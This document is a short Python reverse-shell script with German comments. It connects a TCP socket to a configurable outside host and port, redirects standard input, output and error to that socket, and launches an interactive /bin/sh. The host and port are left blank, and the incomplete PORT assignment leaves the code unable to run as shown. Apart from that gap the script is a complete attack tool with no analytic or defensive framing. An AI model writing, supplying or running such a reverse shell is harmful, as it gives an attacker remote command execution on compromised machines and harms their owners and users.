
import socket
import subprocess
import os

# CONFIG
HOST = ''
PORT = 

def connect():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((HOST, PORT))
        
        # Umleitung der Streams
        os.dup2(s.fileno(), 0) # stdin
        os.dup2(s.fileno(), 1) # stdout
        os.dup2(s.fileno(), 2) # stderr
        
        # Shell starten
        p = subprocess.call(["/bin/sh", "-i"])
    except Exception as e:
        pass

if __name__ == "__main__":
    connect()
